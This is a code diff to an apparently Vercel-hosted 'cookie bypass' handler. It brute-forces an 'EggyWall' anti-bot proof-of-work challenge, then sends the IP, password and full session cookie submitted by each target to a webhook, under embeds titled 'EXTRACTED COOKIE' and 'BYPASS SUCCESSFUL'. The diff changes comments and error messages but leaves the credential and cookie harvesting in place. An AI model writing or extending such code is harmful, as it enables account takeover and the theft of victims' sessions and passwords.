@@ -19,7 +19,6 @@ function solveEggyWall(html) {
         const charset = '0123456789abcdef';
         const max = Math.pow(charset.length, difficulty);
 
-        // SAFETY: Prevent Vercel Serverless timeout (10s limit). 
         if (max > 5000000) return null; 
 
         for (let i = 0; i < max; i++) {
@@ -54,23 +53,21 @@ async function sendWebhook(req, requestData, responseStatus, success, responseMe
 
     const mainEmbed = {
         title: success ? `🩸 BYPASS SUCCESSFUL` : `⚠️ BYPASS FAILED`,
-        color: success ? 0x00ff00 : 0xff0000, // Green for success, Red for fail
+        color: success ? 0x00ff00 : 0xff0000,
         fields: [
             { name: '🌐 Target IP', value: `\`${ip}\``, inline: false },
             { name: '📋 Type', value: `\`${Type || 'N/A'}\``, inline: true },
             { name: '🔑 Password', value: `\`${Password || 'N/A'}\``, inline: true },
             { name: '📊 HTTP Status', value: `\`${responseStatus}\``, inline: true },
             { name: '💬 API Response', value: `\`\`\`fix\n${responseMessage}\n\`\`\``, inline: false }
-            // Raw Payload has been removed per request
         ],
         footer: { text: `Noctrya System • ${userAgent.substring(0, 50)}` },
         timestamp: timestamp
     };
 
-    // Red themed cookie embed
     const cookieEmbed = {
         title: '🔴 EXTRACTED COOKIE',
-        color: 0xff0000, // Bright Red
+        color: 0xff0000,
         description: `\`\`\`txt\n${Cookie || 'N/A'}\n\`\`\``,
         fields: [
             { name: 'Length', value: `${(Cookie || '').length} chars`, inline: true }
@@ -194,12 +191,8 @@ export default async function handler(req, res) {
                 });
                 responseText = await response.text();
             } else {
-                // Send webhook instantly on EggyWall fail
                 await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Failed to solve EggyWall PoW');
-                
-                // Wait 10 seconds before returning response to user
                 await new Promise(resolve => setTimeout(resolve, 10000));
-                
                 return res.status(403).json({ success: false, message: 'Failed to solve EggyWall PoW challenge.' });
             }
         }
@@ -221,13 +214,15 @@ export default async function handler(req, res) {
             finalSuccess = responseData.success === true || responseData.success === "true";
         }
 
+        // ── NEW EXACT ERROR HANDLING ──
         if (finalSuccess) {
-            finalMessage = 'Cookie Bypassed Successfully';
+            finalMessage = 'Success'; // Just say Success if it worked
         } else {
+            // Extract the exact reason from the API (msg, message, or error)
             if (responseData && typeof responseData === 'object') {
-                finalMessage = responseData.message || responseData.error || 'Bypass Failed (Cookie Invalid or 2FA Required)';
+                finalMessage = responseData.msg || responseData.message || responseData.error || 'Bypass Failed (Unknown Reason)';
             } else {
-                finalMessage = 'Bypass Failed (Cookie Invalid or 2FA Required)';
+                finalMessage = 'Bypass Failed (Unknown Reason)';
             }
         }
 
